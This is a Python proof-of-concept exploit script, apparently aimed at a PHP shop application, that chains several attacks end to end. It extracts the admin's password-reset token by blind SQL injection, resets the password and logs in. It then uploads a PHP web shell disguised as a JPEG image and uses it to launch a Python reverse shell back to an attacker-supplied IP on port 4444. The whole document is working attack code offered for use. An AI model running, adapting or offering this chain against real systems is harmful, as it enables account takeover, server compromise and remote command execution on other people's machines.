import sys
import requests
from bs4 import BeautifulSoup


#input parameter
if(len(sys.argv) < 4) :
    print("[+] Usage: python target_url user_admin your_ip")
    print("[+] For Example: python poc.py http://192.168.150.134 admin 127.0.0.1")
    exit()


target = sys.argv[1]
userName = sys.argv[2]
reverseIp = sys.argv[3]
session = requests.Session()


header = {"Content-Type": "application/x-www-form-urlencoded"}
#reset user password
def resetPassword():
    data = {"username" : userName}

    resetUrl = target + "/login/resetPassword.php"
    resetPasswordStatus = session.post(resetUrl, data = data, headers = header, allow_redirects=True)

    resetSoup = BeautifulSoup(resetPasswordStatus.text, features = "html.parser")
    if (resetSoup.find("strong").string != "Success!"):
        print("[+] Reset password failed! Does username exist?")
        exit()
    
    token = binarySearch()

    resetUrl = target + "/login/doResetPassword.php"
    session.get(resetUrl + "?token=" + token)
    data = {"token" : token, "password" : "hopin"}
    
    resetUrl = target + "/login/doChangePassword.php"
    resetPassRes = session.post(resetUrl, data = data, headers = header)
    resetPassSoup = BeautifulSoup(resetPassRes.text, features = "html.parser")
    if(resetPassSoup.find("strong").string != "Success!"):
        print("[+] Reset password failed!")
        exit()
    else:
        print("[+] password change! login with admin/hopin")

#get resetPassword Token with SQL injection

#http://192.168.150.134/item/viewItem.php?id=1%20and%20ascii(substring((select%20token%20from%20user%20limit%200,1),1,1))=121
def binarySearch():
    #http_proxy  = "http://127.0.0.1:8080"
    #proxyDict = {"http"  : http_proxy}
    token = ""
    for tokenIndex in range(1,16):
        lower = 0
        upper = 255
        sqlInjectionUrl = target + "/item/viewItem.php"
        while lower <= upper:            
            mid = (lower + upper) / 2
            SqlTemplate = "?id=1 and ascii(substring((select token from user limit 0,1),{0},1)){1}{2}"
            payload = sqlInjectionUrl + SqlTemplate.format(tokenIndex, ">=", mid)
            sqlRes = session.get(payload, allow_redirects=False)
            
            if(sqlRes.status_code == 404):
                lower = mid + 1
                check = session.get(sqlInjectionUrl + SqlTemplate.format(tokenIndex, "=", mid))
                if(check.status_code == 404):
                    
                    break
            if(sqlRes.status_code == 302):
                upper = mid - 1
        
        token = token + chr(mid)
        
    print("[+] Reset password token is: " + token)
    return token


def login():
    loginUrl = target + "/login/checkLogin.php"
    data = {"username":"admin", "password":"hopin"}
    loginRes = session.post(loginUrl, data = data, headers = header)
    loginSoup = BeautifulSoup(loginRes.text, features = "html.parser")
    if(loginSoup.find("strong").text != "Success!"):
        print("[+] login failed")
        exit()
    else:
        print("[+] login success! uploading file...")

def uploadfile():
    fileName = "shell.phar"
    fileContent = "<?php system($_GET['cmd']);?>"
    uploadUrl = target + "/item/updateItem.php"
    f = open(fileName, "w") 
    f.write(fileContent)
    f.close()

    files = {'image': (fileName, open(fileName, "rb"), 'image/jpeg')}
    data = {'id':2, 'id_user':1, 'name':"ALFA WIFI Adapter", "description":"alfa wifi adapter", "price":12}
    

    session.post(uploadUrl, data=data, files = files)



def getShell():
    shellUrl = target + "/item/image/shell.phar?cmd="
    reverseShellPayload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ reverseIp  +"\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    shellUrl += reverseShellPayload
    shellRes = session.get(shellUrl)
    print("[+] Check your listening terminal!")

def main():
    resetPassword()
    login()
    uploadfile()
    getShell()
    
main()
